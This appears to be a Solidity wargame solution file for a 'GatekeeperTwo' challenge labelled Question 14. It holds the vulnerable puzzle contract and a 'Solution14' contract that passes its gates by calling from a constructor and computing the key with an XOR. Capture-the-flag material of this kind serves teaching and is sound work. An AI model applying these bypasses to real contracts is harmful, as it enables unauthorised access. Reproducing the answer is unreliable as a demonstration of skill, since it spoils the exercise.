// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// Question 14
contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin, "!auth");
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0, "!code");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        unchecked {
            require(
                uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                    uint64(_gateKey) ==
                    uint64(0) - 1,
                "!three"
            );
        }
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract Solution14 {
    constructor(address _target) {
        hack(_target);
        require(GatekeeperTwo(_target).entrant() == msg.sender, "Hack fails");
    }

    function hack(address _target) internal {
        GatekeeperTwo(_target).enter(genGateKey(address(this)));
    }

    function genGateKey(address _addr) public pure returns (bytes8 gateKey) {
        return
            bytes8(
                uint64(bytes8(keccak256(abi.encodePacked(_addr)))) ^
                    type(uint64).max
            );
    }

    function verifyKey(bytes8 _gateKey, address _addr)
        public
        pure
        returns (bool)
    {
        unchecked {
            return
                uint64(bytes8(keccak256(abi.encodePacked(_addr)))) ^
                    uint64(_gateKey) ==
                uint64(0) - 1;
        }
    }

    function testXOR(uint256 a, uint256 b) public pure returns (uint256) {
        return a ^ b;
    }
}